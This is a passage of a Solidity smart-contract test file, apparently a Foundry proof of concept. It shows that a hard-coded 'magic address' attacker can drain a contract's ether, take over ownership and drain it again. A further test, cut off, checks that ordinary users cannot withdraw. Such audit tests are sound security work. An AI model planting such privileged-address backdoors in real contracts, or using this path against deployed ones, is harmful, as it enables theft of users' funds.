    function test_AttackerCanDrainFundsAndBecomeOwner() public {
        // 1. Perform attack from magic address
        uint256 initialAttackerBalance = attacker.balance;
        vm.prank(attacker);
        pie.withdraw();

        // 2. Verify contract funds drained
        assertEq(address(pie).balance, 0, "Contract balance should be drained");

        // 3. Verify attacker received funds
        assertEq(
            attacker.balance,
            initialAttackerBalance + INITIAL_FUNDING,
            "Attacker should receive contract funds"
        );

        // 4. Verify contract ownership transfer
        // Since owner isn't publicly accessible, verify owner privilege by:
        // a. Fund contract again
        uint256 newFunding = 0.5 ether;
        vm.deal(address(pie), newFunding);

        // b. Attempt withdrawal again - attacker should succeed as new owner
        vm.prank(attacker);
        pie.withdraw();

        // c. Verify new funds drained successfully
        assertEq(address(pie).balance, 0, "Funds should be drained again");
        assertEq(
            attacker.balance,
            initialAttackerBalance + INITIAL_FUNDING + newFunding,
            "Attacker should receive second withdrawal"
        );
    }

    function test_RegularUserCannotWithdraw() public {
        address normalUser = makeAddr("normalUser");
        vm.prank(normalUser);

        vm.expectRevert();
        pie.withdraw();
